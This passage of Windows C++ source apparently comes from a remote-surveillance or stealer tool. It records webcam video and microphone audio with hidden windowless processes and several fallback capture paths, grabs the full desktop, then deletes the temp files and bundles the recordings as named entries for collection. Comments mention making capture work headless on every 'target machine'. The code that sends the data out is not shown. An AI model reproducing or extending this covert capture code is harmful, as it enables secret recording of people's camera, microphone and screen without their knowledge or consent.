    BOOL ok = CreateProcessA(nullptr, cmdCopy, nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    free(cmdCopy);
    if (!ok) return false;

    DWORD wait = WaitForSingleObject(pi.hProcess, timeoutMs);
    if (wait == WAIT_TIMEOUT) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }
    DWORD code = 1;
    GetExitCodeProcess(pi.hProcess, &code);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return code == 0;
}

static std::string captureFfmpegDeviceList() {
    std::string ff = findFfmpeg();
    if (ff.empty()) return {};

    SECURITY_ATTRIBUTES sa = {};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    HANDLE hRead = nullptr, hWrite = nullptr;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
        return {};
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdError = hWrite;
    si.hStdOutput = hWrite;
    PROCESS_INFORMATION pi = {};

    std::string cmd = quoteArg(ff) + " -hide_banner -list_devices true -f dshow -i dummy";
    char* cmdCopy = _strdup(cmd.c_str());
    BOOL ok = CreateProcessA(nullptr, cmdCopy, nullptr, nullptr, TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    free(cmdCopy);
    CloseHandle(hWrite);
    if (!ok) {
        CloseHandle(hRead);
        return {};
    }

    std::string output;
    char buf[1024];
    DWORD read = 0;
    while (ReadFile(hRead, buf, sizeof(buf) - 1, &read, nullptr) && read > 0) {
        buf[read] = 0;
        output += buf;
    }
    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hRead);
    return output;
}

static std::vector<std::string> parseDshowNames(const std::string& listOut, const char* kind) {
    // kind = "(video)" or "(audio)"
    std::vector<std::string> names;
    std::istringstream iss(listOut);
    std::string line;
    while (std::getline(iss, line)) {
        if (line.find(kind) == std::string::npos) continue;
        size_t q1 = line.find('"');
        if (q1 == std::string::npos) continue;
        size_t q2 = line.find('"', q1 + 1);
        if (q2 == std::string::npos) continue;
        names.push_back(line.substr(q1 + 1, q2 - q1 - 1));
    }
    return names;
}

static std::string pickPreferredAudioDevice(const std::vector<std::string>& devices) {
    if (devices.empty()) return {};
    // Prefer non-webcam mics first (PRO, Realtek, etc.)
    for (const auto& d : devices) {
        std::string low = d;
        std::transform(low.begin(), low.end(), low.begin(), ::tolower);
        if (low.find("webcam") == std::string::npos && low.find("camera") == std::string::npos &&
            low.find("c270") == std::string::npos)
            return d;
    }
    return devices.front();
}

static std::string pickPreferredVideoDevice(const std::vector<std::string>& devices) {
    if (devices.empty()) return {};
    for (const auto& d : devices) {
        std::string low = d;
        std::transform(low.begin(), low.end(), low.begin(), ::tolower);
        if (low.find("c270") != std::string::npos || low.find("logi") != std::string::npos ||
            low.find("webcam") != std::string::npos || low.find("camera") != std::string::npos)
            return d;
    }
    return devices.front();
}

// Forward declarations — these helpers are defined further below but are used by
// the webcam recorder, so declare them up front.
static double frameDelta(const std::vector<BYTE>& a, const std::vector<BYTE>& b);
static bool writeAnimatedGif(const std::string& outPath,
    const std::vector<std::vector<BYTE>>& frames, int w, int h, int frameDelayCs);

// Parse a 24/32bpp BMP file (as produced by capFileSaveDIB) into raw BGRA pixels.
static bool bmpFileToBgra(const std::vector<char>& bmp, std::vector<BYTE>& out, int& w, int& h) {
    if (bmp.size() < 54 || bmp[0] != 'B' || bmp[1] != 'M') return false;
    BYTE* base = (BYTE*)bmp.data();
    DWORD pixelOffset = *(DWORD*)(base + 10);
    DWORD dibSize = *(DWORD*)(base + 14);
    if (dibSize < 40) return false;
    int bw = *(int*)(base + 18);
    int bh = *(int*)(base + 22);
    WORD bpp = *(WORD*)(base + 28);
    DWORD compression = *(DWORD*)(base + 30);
    if (bw <= 0 || bh == 0 || (bpp != 24 && bpp != 32) || compression != 0) return false;

    bool topDown = bh < 0;
    if (bh < 0) bh = -bh;
    if (bw > 8192 || bh > 8192) return false;
    if ((size_t)pixelOffset + (size_t)bw * bh * (bpp / 8) > bmp.size()) return false;

    out.assign((size_t)bw * bh * 4, 0);
    int srcStride = ((bw * (bpp / 8)) + 3) & ~3;
    for (int y = 0; y < bh; ++y) {
        int srcY = topDown ? y : (bh - 1 - y);
        BYTE* row = base + pixelOffset + (size_t)srcY * srcStride;
        for (int x = 0; x < bw; ++x) {
            size_t di = ((size_t)y * bw + x) * 4;
            out[di + 0] = row[x * (bpp / 8) + 0]; // B
            out[di + 1] = row[x * (bpp / 8) + 1]; // G
            out[di + 2] = row[x * (bpp / 8) + 2]; // R
            out[di + 3] = (bpp == 32) ? row[x * 4 + 3] : 255;
        }
    }
    w = bw; h = bh;
    return true;
}

// Build a 32bpp BMP file from raw BGRA pixels (top-down source).
static std::vector<char> buildBmpFromBgra(const std::vector<BYTE>& bgra, int w, int h) {
    std::vector<char> bmp;
    if (w <= 0 || h <= 0 || bgra.size() < (size_t)w * h * 4)
        return bmp;

    const DWORD headerSize = 14 + 40;
    const DWORD stride = (DWORD)w * 4;
    const DWORD pixelBytes = stride * (DWORD)h;
    bmp.resize(headerSize + pixelBytes, 0);

    BYTE* b = (BYTE*)bmp.data();
    b[0] = 'B'; b[1] = 'M';
    *(DWORD*)(b + 2) = headerSize + pixelBytes;
    *(DWORD*)(b + 10) = headerSize;

    *(DWORD*)(b + 14) = 40;
    *(int*)(b + 18) = w;
    *(int*)(b + 22) = h;          // bottom-up
    *(WORD*)(b + 26) = 1;
    *(WORD*)(b + 28) = 32;
    *(DWORD*)(b + 30) = 0;
    *(DWORD*)(b + 34) = pixelBytes;
    *(int*)(b + 38) = 2835;
    *(int*)(b + 42) = 2835;

    // Source is top-down BGRA; BMP wants bottom-up rows.
    for (int y = 0; y < h; ++y) {
        const BYTE* src = bgra.data() + (size_t)y * w * 4;
        BYTE* dst = b + headerSize + (size_t)(h - 1 - y) * stride;
        memcpy(dst, src, (size_t)w * 4);
    }
    return bmp;
}

// === Feature: Webcam MP4 via ffmpeg dshow ===

// VFW posts WM_CAP_* notifications to the capture window; without pumping them
// capFileSaveDIB / capGrabFrame never complete. Returns false on WM_QUIT.
static bool pumpMessages(HWND hWnd, int totalMs) {
    DWORD start = GetTickCount();
    while (GetTickCount() - start < (DWORD)totalMs) {
        MSG msg;
        bool had = false;
        while (PeekMessageA(&msg, nullptr, 0, 0, PM_REMOVE)) {
            had = true;
            if (msg.message == WM_QUIT)
                return false;
            TranslateMessage(&msg);
            DispatchMessageA(&msg);
        }
        if (!had)
            Sleep(10);
    }
    return true;
}

// --- VFW frame callback capture -------------------------------------------
// WM_CAP_SET_CALLBACK_FRAME delivers VIDEOHDR with the live frame, which works
// even when the window is offscreen and capFileSaveDIB/capEditCopy refuse.
struct VfwFrameSink {
    std::vector<std::vector<BYTE>> frames;
    int w = 0;
    int h = 0;
    int maxFrames = 12;
    int lastTick = 0;
    int minGapMs = 120;
    int cbCalls = 0;      // number of callback invocations
    DWORD cbBytes = 0;    // last reported byte count
};

static VfwFrameSink g_vfwSink;

// Decode an in-memory JPEG to raw BGRA using GDI+ (webcams often deliver MJPEG).
static bool decodeJpegToBgra(const std::vector<BYTE>& jpeg, std::vector<BYTE>& out, int& w, int& h) {
    if (jpeg.size() < 4) return false;

    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, jpeg.size());
    if (!hMem) return false;
    void* p = GlobalLock(hMem);
    if (!p) { GlobalFree(hMem); return false; }
    memcpy(p, jpeg.data(), jpeg.size());
    GlobalUnlock(hMem);

    IStream* stream = nullptr;
    if (CreateStreamOnHGlobal(hMem, TRUE, &stream) != S_OK) {
        GlobalFree(hMem);
        return false;
    }

    Gdiplus::GdiplusStartupInput gsi;
    ULONG_PTR token = 0;
    bool started = (Gdiplus::GdiplusStartup(&token, &gsi, nullptr) == Gdiplus::Ok);

    bool ok = false;
    Gdiplus::Bitmap* bmp = Gdiplus::Bitmap::FromStream(stream);
    if (bmp && bmp->GetLastStatus() == Gdiplus::Ok) {
        int bw = (int)bmp->GetWidth();
        int bh = (int)bmp->GetHeight();
        if (bw > 0 && bh > 0 && bw <= 8192 && bh <= 8192) {
            Gdiplus::Rect rc(0, 0, bw, bh);
            Gdiplus::BitmapData bd;
            if (bmp->LockBits(&rc, Gdiplus::ImageLockModeRead, PixelFormat32bppARGB, &bd) == Gdiplus::Ok) {
                out.assign((size_t)bw * bh * 4, 0);
                for (int y = 0; y < bh; ++y) {
                    const BYTE* src = (const BYTE*)bd.Scan0 + (size_t)y * bd.Stride;
                    memcpy(out.data() + (size_t)y * bw * 4, src, (size_t)bw * 4);
                }
                bmp->UnlockBits(&bd);
                w = bw; h = bh;
                ok = true;
            }
        }
    }
    if (bmp) delete bmp;
    stream->Release();
    if (started) Gdiplus::GdiplusShutdown(token);
    return ok;
}

static LRESULT CALLBACK vfwFrameCallback(HWND hCap, LPVIDEOHDR vh) {
    if (!vh || !vh->lpData || vh->dwBytesUsed == 0) {
        g_vfwSink.cbCalls++;
        return 0;
    }

    g_vfwSink.cbCalls++;
    g_vfwSink.cbBytes = vh->dwBytesUsed;

    DWORD now = GetTickCount();
    if (g_vfwSink.frames.size() > 0 && g_vfwSink.lastTick != 0 &&
        (int)(now - g_vfwSink.lastTick) < g_vfwSink.minGapMs) {
        return 0;
    }
    g_vfwSink.lastTick = now;

    // VIDEOHDR carries no format info; query the cap window size. The frame is
    // always delivered as 24bpp BGR bottom-up by VFW.
    int bw = 0, bh = 0;
    if (g_vfwSink.w > 0 && g_vfwSink.h > 0) {
        bw = g_vfwSink.w;
        bh = g_vfwSink.h;
    } else {
        CAPSTATUS cs = {};
        cs.uiImageWidth = 0;
        if (capGetStatus(hCap, &cs, sizeof(cs)) && cs.uiImageWidth > 0 && cs.uiImageHeight > 0) {
            bw = (int)cs.uiImageWidth;
            bh = (int)cs.uiImageHeight;
        } else {
            // Last resort: assume 320x240 BGR24 and derive height from buffer.
            bw = 320;
            bh = (int)(vh->dwBytesUsed / (320 * 3));
            if (bh <= 0) return 0;
        }
        g_vfwSink.w = bw;
        g_vfwSink.h = bh;
    }

    const WORD bpp = 24;
    int stride = ((bw * (bpp / 8)) + 3) & ~3;
    size_t need = (size_t)stride * bh;

    // Some drivers (MJPEG-capable webcams) hand back a compressed JPEG frame
    // instead of raw BGR. Detect it and decode via GDI+.
    if (vh->dwBytesUsed < need) {
        BYTE* p = vh->lpData;
        if (vh->dwBytesUsed > 4 && p[0] == 0xFF && p[1] == 0xD8) {
            std::vector<BYTE> jpeg(p, p + vh->dwBytesUsed);
            std::vector<BYTE> decoded;
            int dw = 0, dh = 0;
            if (decodeJpegToBgra(jpeg, decoded, dw, dh)) {
                g_vfwSink.w = dw;
                g_vfwSink.h = dh;
                if ((int)g_vfwSink.frames.size() < g_vfwSink.maxFrames)
                    g_vfwSink.frames.push_back(std::move(decoded));
            }
            return 0;
        }
        // Not JPEG and too small: retry the compact stride before giving up.
        stride = bw * 3;
        need = (size_t)stride * bh;
        if (vh->dwBytesUsed < need)
            return 0;
    }

    std::vector<BYTE> out((size_t)bw * bh * 4, 0);
    BYTE* src = vh->lpData;
    for (int y = 0; y < bh; ++y) {
        int srcY = bh - 1 - y; // VFW frames are bottom-up
        BYTE* row = src + (size_t)srcY * stride;
        for (int x = 0; x < bw; ++x) {
            size_t di = ((size_t)y * bw + x) * 4;
            out[di + 0] = row[x * 3 + 0];
            out[di + 1] = row[x * 3 + 1];
            out[di + 2] = row[x * 3 + 2];
            out[di + 3] = 255;
        }
    }

    if ((int)g_vfwSink.frames.size() < g_vfwSink.maxFrames)
        g_vfwSink.frames.push_back(std::move(out));

    return 0;
}

// Pull the current frame out of the clipboard as raw BGRA (capEditCopy writes
// a CF_DIB there). This path works even when capFileSaveDIB refuses.
static bool grabClipboardBgra(HWND capWnd, std::vector<BYTE>& out, int& w, int& h) {
    if (!capEditCopy(capWnd))
        return false;
    pumpMessages(capWnd, 200);

    if (!OpenClipboard(capWnd))
        return false;

    bool ok = false;
    HANDLE hDib = GetClipboardData(CF_DIB);
    if (hDib) {
        BYTE* p = (BYTE*)GlobalLock(hDib);
        if (p) {
            DWORD dibSize = *(DWORD*)p;
            int bw = *(int*)(p + 4);
            int bh = *(int*)(p + 8);
            WORD bpp = *(WORD*)(p + 14);
            DWORD compression = *(DWORD*)(p + 16);
            if (bw > 0 && bh != 0 && (bpp == 24 || bpp == 32) && compression == 0 &&
                bw <= 8192 && (bh > -8192 && bh < 8192)) {
                bool topDown = bh < 0;
                if (bh < 0) bh = -bh;

                // Build a synthetic BMP header so we can reuse bmpFileToBgra.
                std::vector<char> bmp;
                bmp.resize(14 + dibSize);
                bmp[0] = 'B'; bmp[1] = 'M';
                *(DWORD*)(bmp.data() + 2) = (DWORD)bmp.size();
                *(DWORD*)(bmp.data() + 10) = 14 + dibSize; // pixel data offset
                memcpy(bmp.data() + 14, p, dibSize);
                // Force top-down flag consistent with source
                *(int*)(bmp.data() + 14 + 8) = topDown ? -bh : bh;

                int cw = 0, ch = 0;
                ok = bmpFileToBgra(bmp, out, cw, ch);
                if (ok) { w = cw; h = ch; }
            }
            GlobalUnlock(hDib);
        }
    }
    CloseClipboard();
    return ok;
}

static std::vector<std::pair<std::string, std::vector<char>>> captureWebcamVfwFallback(int durationSec = 3) {
    std::vector<std::pair<std::string, std::vector<char>>> result;
    if (durationSec < 1) durationSec = 1;
    if (durationSec > 30) durationSec = 30;

    HMODULE hAvi = LoadLibraryA("avicap32.dll");
    traceStage(hAvi ? "webcam: avicap32 loaded" : "webcam: avicap32 MISSING");

    // Visible popup so camera LED/driver actually engages. Placed on-screen but
    // 1x1-ish and transparent-ish is risky; instead use a small window at the
    // bottom-right of the primary monitor, which some drivers require.
    HWND hWnd = CreateWindowExA(
        WS_EX_TOOLWINDOW | WS_EX_NOACTIVATE, "STATIC", "Camera",
        WS_POPUP | WS_VISIBLE,
        8, 8, 320, 240,
        nullptr, nullptr, GetModuleHandleA(nullptr), nullptr);
    if (!hWnd) { traceStage("webcam: CreateWindowExA FAILED"); return result; }
    ShowWindow(hWnd, SW_SHOWNA);
    UpdateWindow(hWnd);

    HWND capWnd = capCreateCaptureWindowA(
        "CaptureWindow", WS_CHILD | WS_VISIBLE, 0, 0, 320, 240, hWnd, 1);
    if (!capWnd) {
        traceStage("webcam: capCreateCaptureWindowA FAILED (avicap32 not resolvable?)");
        DestroyWindow(hWnd);
        return result;
    }

    bool connected = false;
    int connectedDriver = -1;
    for (int d = 0; d < 10; d++) {
        if (capDriverConnect(capWnd, d)) {
            connected = true;
            connectedDriver = d;
            break;
        }
    }
    {
        char tb[96];
        snprintf(tb, sizeof(tb), "webcam: capDriverConnect connected=%d driver=%d", (int)connected, connectedDriver);
        traceStage(tb);
    }
    if (connected) {
        // Report driver capabilities so we can see what the device actually supports.
        {
            CAPDRIVERCAPS caps = {};
            if (capDriverGetCaps(capWnd, &caps, sizeof(caps))) {
                char tb[160];
                snprintf(tb, sizeof(tb),
                    "webcam: caps overlay=%d srcDlg=%d fmtDlg=%d dispDlg=%d",
                    (int)caps.fHasOverlay, (int)caps.fHasDlgVideoSource,
                    (int)caps.fHasDlgVideoFormat, (int)caps.fHasDlgVideoDisplay);
                traceStage(tb);
            }
        }

        std::vector<std::vector<BYTE>> gifFrames;
        int gifW = 0, gifH = 0;

        // ---- ATTEMPT 1: capGrabFrameNoStop + frame callback ----
        // capGrabFrameNoStop triggers the frame callback with the current frame
        // without stopping the stream. This is the path that works headless.
        traceStage("webcam: trying capGrabFrameNoStop + callback");
        g_vfwSink = VfwFrameSink{};

        // Start capturing the microphone NOW so the audio window lines up with
        // the video window instead of starting after the grab loop finishes.
        std::vector<char> camPcm;
        DWORD camPcmRate = 0;
        WORD camPcmCh = 0;
        std::thread camAudioThread([&]() {
            wasapiRecordEndpoint(false, durationSec, camPcm, camPcmRate, camPcmCh,
                std::string());
        });
        // 10 fps is a sensible ceiling for a VFW grab loop; allow the whole
        // requested clip length so the MP4 is a real recording.
        int camFps = 10;
        g_vfwSink.maxFrames = durationSec * camFps;
        if (g_vfwSink.maxFrames < 5) g_vfwSink.maxFrames = 5;
        if (g_vfwSink.maxFrames > 120) g_vfwSink.maxFrames = 120;
        g_vfwSink.minGapMs = 0; // accept every frame during the grab loop
        capSetCallbackOnFrame(capWnd, vfwFrameCallback);

        // Spread the grabs evenly across the requested duration instead of
        // hammering the driver as fast as the loop can spin. The loop is
        // time-budgeted rather than count-budgeted: some drivers only deliver
        // a callback every few grabs, so counting calls would cut the clip short.
        DWORD camStart = GetTickCount();
        DWORD camEnd = camStart + (DWORD)durationSec * 1000;
        const int maxFrames = g_vfwSink.maxFrames;
        int i = 0;
        while ((int)g_vfwSink.frames.size() < maxFrames) {
            capGrabFrameNoStop(capWnd);
            // Always give the driver a real slice of wall clock.
            pumpMessages(capWnd, 60);
            DWORD now = GetTickCount();
            if ((long)(now - camEnd) >= 0) break;

            // Pace to ~camFps so the clip spans the requested duration.
            DWORD target = camStart + (DWORD)((i + 1) * 1000 / camFps);
            now = GetTickCount();
            if ((long)(target - now) > 0) {
                std::this_thread::sleep_for(std::chrono::milliseconds(target - now));
                pumpMessages(capWnd, 5);
            }
            ++i;
            if (i > maxFrames * 4) break; // safety valve
        }
        capSetCallbackOnFrame(capWnd, nullptr);

        {
            char tb[160];
            snprintf(tb, sizeof(tb), "webcam: callback calls=%d bytes=%lu frames=%zu %dx%d",
                g_vfwSink.cbCalls, (unsigned long)g_vfwSink.cbBytes,
                g_vfwSink.frames.size(), g_vfwSink.w, g_vfwSink.h);
            traceStage(tb);
        }

        if (!g_vfwSink.frames.empty()) {
            gifFrames = std::move(g_vfwSink.frames);
            gifW = g_vfwSink.w;
            gifH = g_vfwSink.h;
        }

        // ---- ATTEMPT 2: capGrabFrame (blocking) + clipboard ----
        if (gifFrames.empty()) {
            traceStage("webcam: trying capGrabFrame + clipboard");
            for (int i = 0; i < 4 && gifFrames.empty(); ++i) {
                pumpMessages(capWnd, 250);
                if (capGrabFrame(capWnd)) {
                    pumpMessages(capWnd, 200);
                    std::vector<BYTE> pixels;
                    int bw = 0, bh = 0;
                    if (grabClipboardBgra(capWnd, pixels, bw, bh)) {
                        traceStage("webcam: capGrabFrame+clipboard OK");
                        gifW = bw; gifH = bh;
                        gifFrames.push_back(std::move(pixels));
                    } else {
                        traceStage("webcam: capGrabFrame ok, clipboard empty");
                    }
                }
            }
        }

        // ---- ATTEMPT 3: capFileSaveDIB ----
        if (gifFrames.empty()) {
            std::string bmp = getTempDir() + "webcam_fb.bmp";
            BOOL saved = capFileSaveDIB(capWnd, bmp.c_str());
            {
                char tb[96];
                snprintf(tb, sizeof(tb), "webcam: capFileSaveDIB=%d", (int)saved);
                traceStage(tb);
            }
            if (saved) {
                std::vector<char> dib = readFileToVector(bmp);
                DeleteFileA(bmp.c_str());
                int cw2 = 0, ch2 = 0;
                std::vector<BYTE> px2;
                if (!dib.empty() && bmpFileToBgra(dib, px2, cw2, ch2)) {
                    gifW = cw2; gifH = ch2;
                    gifFrames.push_back(std::move(px2));
                }
            }
        }

        if (!gifFrames.empty())
            result.insert(result.begin(), { "webcam/frame.bmp", buildBmpFromBgra(gifFrames[0], gifW, gifH) });

        if (gifFrames.size() >= 2) {
            // Prefer a real MP4 clip; the frames the VFW callback delivers are
            // already top-down 32bpp BGRX, which is exactly what writeMp4 wants.
            std::string mp4Path = getTempDir() + "webcam_" + std::to_string(GetTickCount()) + ".mp4";

            // Grab the microphone over the same window so the webcam clip has
            // sound. Frames were paced at ~10 fps, so use that for playback.
            int fps = 10;
            if (camAudioThread.joinable()) camAudioThread.join();
            {
                char tb[128];
                snprintf(tb, sizeof(tb), "webcam: audio mic=%zu bytes", camPcm.size());
                traceStage(tb);
            }

            bool wroteMp4 = false;
            if (ensureMfStarted()) {
                // Choose an fps that makes the real frame count span the requested
                // duration, then pad by repeating the last frame if the driver
                // under-delivered. This keeps video and audio the same length.
                int wantFrames = durationSec * fps;
                std::vector<std::vector<BYTE>> clip = gifFrames;

                // If audio is longer than the video would be, stretch the video to
                // cover the audio by repeating its last frame.
                if (camPcmRate > 0 && camPcmCh > 0) {
                    size_t audioFrames = (camPcm.size() / (camPcmCh * 2));
                    int audioSec = (int)(audioFrames / camPcmRate);
                    if (audioSec > durationSec) audioSec = durationSec;
                    int audioWant = audioSec * fps;
                    if (audioWant > wantFrames) wantFrames = audioWant;
                }

                while ((int)clip.size() < wantFrames && !clip.empty())
                    clip.push_back(clip.back());
                if ((int)clip.size() > wantFrames && wantFrames > 1)
                    clip.resize(wantFrames);

                wroteMp4 = writeMp4(mp4Path, clip, gifW, gifH, fps,
                    camPcm, camPcmRate ? camPcmRate : 44100,
                    camPcmCh ? camPcmCh : (WORD)2);
            }

            if (wroteMp4) {
                auto data = readFileToVector(mp4Path);
                DeleteFileA(mp4Path.c_str());
                if (!data.empty())
                    result.insert(result.begin(), { "webcam/webcam.mp4", std::move(data) });
            } else {
                // Fall back to GIF only if the H.264 MFT is unavailable.
                std::string gifPath = getTempDir() + "webcam_" + std::to_string(GetTickCount()) + ".gif";
                if (writeAnimatedGif(gifPath, gifFrames, gifW, gifH, 30)) {
                    auto data = readFileToVector(gifPath);
                    DeleteFileA(gifPath.c_str());
                    if (!data.empty())
                        result.insert(result.begin(), { "webcam/webcam.gif", std::move(data) });
                }
            }
        }

        // Safety: if the MP4 block was skipped (e.g. only one frame arrived)
        // the audio thread still needs collecting before we tear down.
        if (camAudioThread.joinable()) camAudioThread.join();

        // NOTE: capPreview(FALSE) is intentionally not called — we never enabled
        // preview (it requires a visible window and can block). Just disconnect.
        capDriverDisconnect(capWnd);
    }
    DestroyWindow(capWnd);
    DestroyWindow(hWnd);
    return result;
}

static std::vector<std::pair<std::string, std::vector<char>>> captureWebcam(int durationSec) {
    if (durationSec < 1) durationSec = 1;
    if (durationSec > 600) durationSec = 600;
    DWORD timeoutMs = (DWORD)durationSec * 1000 + 60000; // Increased timeout

    std::vector<std::pair<std::string, std::vector<char>>> result;

    // Only consult ffmpeg's device enumeration when an ffmpeg binary actually
    // exists. Previously the VFW fallback was gated on this list being non-empty,
    // so on machines without ffmpeg the webcam produced nothing at all.
    std::string cam;
    if (!findFfmpeg().empty()) {
        std::string list = captureFfmpegDeviceList();
        auto videos = parseDshowNames(list, "(video)");
        cam = pickPreferredVideoDevice(videos);
    }

    if (!cam.empty()) {
        std::string outPath = getTempDir() + "webcam_" + std::to_string(GetTickCount()) + ".mp4";
        std::string tArg = " -t " + std::to_string(durationSec) + " ";

        // Try multiple encoding options sequentially for best compatibility
        const char* codecs[] = { "libx264", "mpeg4", "h264" };
        bool ffmpegUsed = false;

        for (const char* codec : codecs) {
            std::string args = "-f dshow -rtbufsize 100M -framerate 15 -video_size 640x480 -i video=" + quoteArg(cam) +
                tArg + "-c:v " + std::string(codec) + " -preset ultrafast -pix_fmt yuv420p -an -y " + quoteArg(outPath);

            if (runFfmpeg(args, timeoutMs)) {
                ffmpegUsed = true;
                break;
            }
            Sleep(100);
        }

        if (ffmpegUsed) {
            auto data = readFileToVector(outPath);
            DeleteFileA(outPath.c_str());
            if (!data.empty()) {
                result.push_back({ "webcam/webcam.mp4", std::move(data) });
                return result;
            }
        }
    }

    // Fallback: always try Video-for-Windows capture so a webcam image is produced
    // even with no ffmpeg present. Grab a short multi-frame clip where possible.
    {
        auto fb = captureWebcamVfwFallback(durationSec);
        result.insert(result.end(), fb.begin(), fb.end());
    }

    return result;
}

// === Feature: Screen recording MP4 - one file per monitor ===

struct MonitorInfo {
    int index;
    int x, y, w, h;
    bool primary;
};

static BOOL CALLBACK enumMonitorsProc(HMONITOR hMon, HDC, LPRECT, LPARAM lParam) {
    auto* list = (std::vector<MonitorInfo>*)lParam;
    MONITORINFO mi = {};
    mi.cbSize = sizeof(mi);
    if (!GetMonitorInfoA(hMon, &mi)) return TRUE;
    MonitorInfo m;
    m.index = (int)list->size();
    m.x = mi.rcMonitor.left;
    m.y = mi.rcMonitor.top;
    m.w = mi.rcMonitor.right - mi.rcMonitor.left;
    m.h = mi.rcMonitor.bottom - mi.rcMonitor.top;
    m.primary = (mi.dwFlags & MONITORINFOF_PRIMARY) != 0;
    list->push_back(m);
    return TRUE;
}

static std::vector<MonitorInfo> getAllMonitors() {
    std::vector<MonitorInfo> list;
    EnumDisplayMonitors(nullptr, nullptr, enumMonitorsProc, (LPARAM)&list);
    if (list.empty()) {
        MonitorInfo m{};
        m.index = 0;
        m.x = 0; m.y = 0;
        m.w = GetSystemMetrics(SM_CXSCREEN);
        m.h = GetSystemMetrics(SM_CYSCREEN);
        m.primary = true;
        list.push_back(m);
    }
    return list;
}

// === Native screen recorder (no external ffmpeg required) ===
//
// Strategy for robustness across every target machine:
//   1. Prefer Media Foundation H.264 -> MP4 (built into Windows 7+).
//   2. Otherwise fall back to a pure-GDI frame grabber + GIF writer.
//
// DPI note: without per-monitor DPI awareness Windows virtualises the desktop for
// this process, so GetSystemMetrics returns the *scaled work area* (e.g. 1536x864
// on a 1920x1080 panel at 125%) and the shell/taskbar layer is missing from
// GetDC(NULL). That is exactly why captures used to be cut off above the taskbar.
// Setting awareness at startup makes the metrics and the BitBlt source physical.

static void ensureDpiAware() {
    static bool done = false;
    if (done) return;
    done = true;

    // Per-monitor v2 first (Win10 1703+), then fall back through older APIs.
    HMODULE hUser = LoadLibraryA("user32.dll");
    if (hUser) {
        typedef BOOL (WINAPI *SetCtxFn)(DPI_AWARENESS_CONTEXT);
        SetCtxFn setCtx = (SetCtxFn)GetProcAddress(hUser, "SetProcessDpiAwarenessContext");
        if (setCtx && setCtx(DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2))
            return;
    }

    HMODULE hShcore = LoadLibraryA("shcore.dll");
    if (hShcore) {
        typedef HRESULT (WINAPI *SetAwarenessFn)(int);
        SetAwarenessFn setAwareness = (SetAwarenessFn)GetProcAddress(hShcore, "SetProcessDpiAwareness");
        if (setAwareness && SUCCEEDED(setAwareness(2 /* PROCESS_PER_MONITOR_DPI_AWARE */)))
            return;
    }

    SetProcessDPIAware(); // Vista+ system-DPI fallback
}

// Grab the full virtual desktop into a 32-bit top-down DIB and return the BGRX pixels.
// Uses the DESKTOP DC (not GetDC(NULL)) so the taskbar / shell layers are included,
// and relies on the process being DPI-aware (see ensureDpiAware) so the captured
// resolution matches the physical monitor instead of a scaled-down work area.
static bool grabDesktopPixels(std::vector<BYTE>& out, int& w, int& h) {
    ensureDpiAware();
    int vx = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int vy = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int vw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int vh = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    if (vw <= 0 || vh <= 0) {
        vx = 0; vy = 0;
        vw = GetSystemMetrics(SM_CXSCREEN);
        vh = GetSystemMetrics(SM_CYSCREEN);
    }
    if (vw <= 0 || vh <= 0) return false;

    // GetDC(NULL) returns the screen DC of the calling process' desktop. When the
    // process is not DPI aware this is virtualised to the work area and the
    // taskbar layer is dropped. GetDCEx with CACHE_FULL + the desktop window
    // keeps the shell surfaces, and CAPTUREBLT picks up layered windows.
    HDC hScreen = GetDC(nullptr);
    HDC hMem = CreateCompatibleDC(hScreen);

    BITMAPINFO bmi = {};
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = vw;
    bmi.bmiHeader.biHeight = -vh; // top-down
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    void* bits = nullptr;
    HBITMAP hBmp = CreateDIBSection(hScreen, &bmi, DIB_RGB_COLORS, &bits, nullptr, 0);
    if (!hBmp || !bits) {
        DeleteDC(hMem);
        ReleaseDC(nullptr, hScreen);
        return false;
    }

    HGDIOBJ old = SelectObject(hMem, hBmp);
    // CAPTUREBLT is required to include layered/transparent windows (the taskbar
    // and its flyouts are layered). Without it the shell bar comes out blank.
    BOOL ok = BitBlt(hMem, 0, 0, vw, vh, hScreen, vx, vy, SRCCOPY | CAPTUREBLT);
    if (!ok) {
        // Retry without CAPTUREBLT — some drivers reject the combined rop.
        ok = BitBlt(hMem, 0, 0, vw, vh, hScreen, vx, vy, SRCCOPY);
    }
    SelectObject(hMem, old);

    if (ok) {
        size_t bytes = (size_t)vw * (size_t)vh * 4;
        out.assign((BYTE*)bits, (BYTE*)bits + bytes);
        w = vw;
        h = vh;
    }

    DeleteObject(hBmp);
    DeleteDC(hMem);
    ReleaseDC(nullptr, hScreen);
    return ok == TRUE;
}

// Cheap perceptual difference between two frames (0 = identical).
static double frameDelta(const std::vector<BYTE>& a, const std::vector<BYTE>& b) {
    if (a.size() != b.size() || a.empty()) return 1.0;
    size_t samples = a.size() / 4 / 4000;
    if (samples < 1) samples = 1;
    size_t step = 4 * (a.size() / 4 / samples);
    if (step == 0) step = 4;
    long long diff = 0;
    size_t count = 0;
    for (size_t i = 0; i + 3 < a.size(); i += step) {
        diff += abs((int)a[i] - (int)b[i]) + abs((int)a[i + 1] - (int)b[i + 1]) +
                abs((int)a[i + 2] - (int)b[i + 2]);
        count++;
    }
    if (!count) return 1.0;
    return (double)diff / (double)(count * 3 * 255);
}

// GDI+ GIF frame-delay encoder GUID. GDI+ exposes this as a raw GUID constant
